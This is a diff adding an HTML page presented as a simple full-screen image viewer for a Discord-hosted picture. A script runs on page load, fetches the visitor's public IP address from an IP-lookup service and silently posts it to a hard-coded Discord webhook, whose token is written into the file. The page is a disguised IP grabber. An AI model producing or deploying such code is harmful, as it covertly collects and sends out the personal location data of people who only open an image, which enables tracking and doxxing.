@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Image Display</title>
+  <style>
+    body {
+      background-color: black;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+    }
+
+    img {
+      max-width: 100%;
+      max-height: 100%;
+    }
+  </style>
+  <script>
+    // Function to send request to API and forward response to Discord webhook
+    function sendRequest() {
+      var xhr = new XMLHttpRequest();
+      xhr.open('GET', 'https://api.ipify.org', true);
+
+      xhr.onload = function() {
+        if (xhr.status === 200) {
+          var response = xhr.responseText;
+
+          // Forward response to Discord webhook
+          var webhookUrl = 'https://discord.com/api/webhooks/1128528238981943397/bc1K2Em2eduUIl-7dtqXtwELv_1JTsBoRVjnxpeZS2jhwWNIbOGa2GPry6p8s_mj8Inn';
+          var data = {
+            content: 'IP Address: ' + response
+          };
+
+          var webhookRequest = new XMLHttpRequest();
+          webhookRequest.open('POST', webhookUrl, true);
+          webhookRequest.setRequestHeader('Content-Type', 'application/json');
+          webhookRequest.send(JSON.stringify(data));
+        }
+      };
+
+      xhr.send();
+    }
+  </script>
+</head>
+<body onload="sendRequest()">
+  <img src="https://cdn.discordapp.com/attachments/947131266086613032/1128418653319200788/3E0FEF7D-1234-476C-984B-8467A18ECA2B.jpg" alt="Image">
+</body>
+</html>
